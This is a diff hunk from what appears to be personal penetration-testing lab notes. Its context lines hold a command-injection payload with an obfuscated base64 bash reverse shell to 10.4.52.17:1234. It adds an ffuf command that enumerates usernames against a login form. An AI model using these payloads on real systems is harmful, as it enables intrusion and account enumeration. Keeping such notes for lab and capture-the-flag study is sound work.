@@ -218,6 +218,11 @@ reverse shell
 change bash reverse shell into base64
 {"target":"\" \necho YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC40LjUyLjE3LzEyMzQgMD4mMQo=  | base64 -d | bash\n"}
 _________________________________________________________________________________________________________________________________________________________________________________________________________________
+Username Fuzzing with ffuf
+--------------------------
+ffuf -u http://83.136.253.59:57639/index.php -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -X POST -H "Content-Type:application/x-www-form-urlencoded" 
+-d "username=FUZZ&password=invalid" -fr "Unknown user"
+_________________________________________________________________________________________________________________________________________________________________________________________________________________
 CURL , FFUF and eval rce
 --------------------------
 
